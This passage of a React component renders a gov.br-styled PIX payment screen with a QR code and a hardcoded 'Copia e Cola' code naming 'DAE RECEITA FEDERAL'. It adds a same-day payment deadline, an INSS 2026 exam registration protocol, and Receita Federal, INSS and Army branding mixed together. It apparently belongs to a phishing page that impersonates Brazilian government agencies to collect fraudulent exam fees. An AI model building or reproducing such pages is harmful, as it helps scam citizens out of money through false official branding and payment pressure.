                            e.currentTarget.src = `data:image/png;base64,${pixData.qrCode}`;
                          }
                        }}
                      />
                    ) : (
                      <div style={{ width: '160px', height: '160px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#666', fontSize: '12px', textAlign: 'center' }}>
                        <div>
                          <div className="animate-spin rounded-full h-8 w-8 border-2 border-gray-300 mx-auto mb-2" style={{ borderTopColor: '#1351B4' }} />
                          Gerando código...
                        </div>
                      </div>
                    )}
                  </div>
                </div>

                <div style={{ background: '#f5f5f5', padding: '12px', marginBottom: '16px' }}>
                  <div style={{ fontSize: '10px', color: '#777', marginBottom: '4px', textAlign: 'center' }}>
                    Código PIX Copia e Cola
                  </div>
                  <div style={{ background: 'white', border: '1px solid #ddd', padding: '8px', marginBottom: '8px' }}>
                    <p style={{ wordBreak: 'break-all', fontSize: '9px', lineHeight: 1.3, color: '#333', textAlign: 'center', margin: 0 }}>
                      00020101021226820014br.gov.bcb.pix2560qrcode.gov.br/v1/1bcd94bd-289a-488b-8269-ac26aad6d3365204000053039865802BR5916DAE RECEITA FEDERAL6008SAOPAULO62070503***63048264
                    </p>
                  </div>
                  <button
                    onClick={handleCopyPixCode}
                    disabled={!pixData?.pixCode}
                    style={{
                      width: '100%',
                      padding: '12px',
                      backgroundColor: pixData?.pixCode ? copyButtonColor : '#9ca3af',
                      color: 'white',
                      fontWeight: 'bold',
                      border: 'none',
                      cursor: pixData?.pixCode ? 'pointer' : 'not-allowed',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      gap: '8px',
                      fontSize: '14px',
                    }}
                  >
                    <i className={isCopied ? 'fas fa-check' : 'fas fa-copy'} />
                    <span>{copyButtonText}</span>
                  </button>
                </div>

                {/* Status do pagamento */}
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', fontSize: '12px', color: '#666', marginBottom: '16px' }}>
                  {paymentVerified ? (
                    <>
                      <div style={{ width: '12px', height: '12px', background: '#22c55e', borderRadius: '50%' }} />
                      <span style={{ color: '#22c55e', fontWeight: 'bold' }}>Pagamento confirmado!</span>
                    </>
                  ) : (
                    <>
                      <div
                        style={{ width: '8px', height: '8px', background: '#22c55e', borderRadius: '50%' }}
                        className="animate-pulse"
                      />
                      <span>Aguardando confirmação do pagamento...</span>
                    </>
                  )}
                </div>
              </div>
            </div>

            {/* Aviso de vencimento */}
            <div style={{ maxWidth: '1200px', margin: '8px auto 0 auto', backgroundColor: '#fff3cd', padding: '12px', textAlign: 'center' }}>
              <p style={{ fontSize: '12px', color: '#856404', margin: 0 }}>
                <i className="fas fa-exclamation-triangle" style={{ marginRight: '8px' }} />
                <strong>ATENÇÃO:</strong> Este documento é válido apenas para pagamento na data de hoje ({dataHoje}).
              </p>
            </div>

            {/* Protocolo */}
            <div style={{ maxWidth: '1200px', margin: '8px auto 0 auto', backgroundColor: 'white', padding: '12px', textAlign: 'center', fontSize: '10px', color: '#666' }}>
              <p style={{ margin: 0 }}>
                Protocolo de Inscrição: {boletoValidationCode || guiaNumero} | Concurso Público INSS 2026{boletoExamCity ? ` — ${boletoExamCity}` : ''}
              </p>
            </div>

            {/* Rodapé */}
            <footer style={{ backgroundColor: '#071D41', padding: '24px 16px', marginTop: '8px' }}>
              <div style={{ maxWidth: '1200px', margin: '0 auto', textAlign: 'center' }}>
                <img
                  src={LOGO_RECEITA_URL}
                  alt="Receita Federal"
                  style={{ height: '40px', margin: '0 auto 12px auto', filter: 'brightness(0) invert(1)', display: 'block', objectFit: 'contain' }}
                />
                <p style={{ color: '#9ca3af', fontSize: '12px', margin: '0 0 4px 0' }}>
                  Instituto Nacional do Seguro Social
                </p>
                <p style={{ color: '#6b7280', fontSize: '10px', margin: 0 }}>
                  Portal gov.br/inss — Todos os direitos reservados
                </p>
              </div>
            </footer>

          </div>
        </DialogContent>
      </Dialog>

      <ExercitoFooter />
    </div>
  );
}
